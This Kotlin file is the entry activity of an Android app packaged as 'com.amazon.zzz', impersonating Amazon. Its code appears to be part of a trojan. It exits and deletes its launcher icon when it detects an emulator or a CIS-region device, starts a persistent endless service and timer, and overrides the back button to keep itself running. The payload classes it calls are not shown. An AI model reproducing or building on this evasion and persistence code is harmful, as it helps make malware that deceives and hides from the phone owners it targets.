package com.amazon.zzz

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.amazon.zzz.Services.srvEndlessService
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm.a3


class MainActivity : Activity() {

    private val TAG_LOG = MainActivity::class.java.simpleName + " >> "

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        SharedPreferencess.init(applicationContext)

        if (utUtils.blockCIS(applicationContext) || utUtils.isRunningOnEmulator()) {
            runCatching {
                utUtils.deleteLabelIcon(this)
            }
            finish()
            return
        }

        val startFromPush: Boolean = intent.getBooleanExtra("FromPush", false)

        ///< Check initialization if error then do it!
        val str = SharedPreferencess.initialization
        if (str?.contains("good") != true) {
            utUtils.Log(TAG_LOG, "Initialization Start!")
            utUtils.initialization(this)
        }
        start(startFromPush)
    }

    override fun onBackPressed() {
        start(startFromPush = true)
    }

    private fun start(startFromPush: Boolean) {
        utUtils.startCustomTimer(applicationContext, 10000)
        srvEndlessService.autoStart(applicationContext)

        startActivity(
            Intent(applicationContext, a3)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                .putExtra("FromPush", startFromPush)
        )
        Handler(Looper.getMainLooper()).postDelayed({
            finish()
        }, 100)
    }

}